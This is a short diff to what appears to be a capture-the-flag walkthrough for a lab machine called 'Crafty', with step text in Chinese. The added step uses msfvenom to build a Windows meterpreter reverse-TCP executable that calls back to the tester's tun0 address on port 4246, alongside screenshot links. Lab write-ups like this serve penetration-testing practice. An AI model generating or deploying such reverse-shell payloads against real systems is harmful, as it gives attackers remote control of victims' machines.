@@ -96,4 +96,7 @@ Crafty Level:Easy
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/2c95e33c-af3f-4ca2-bc25-cf753b06c891)
 
+    20.使用msfvenom另外建立一個reverse shell
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4246 -f exe -o exp2.exe
 
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/4392be79-8ed0-4349-b9ff-73f93da94669)
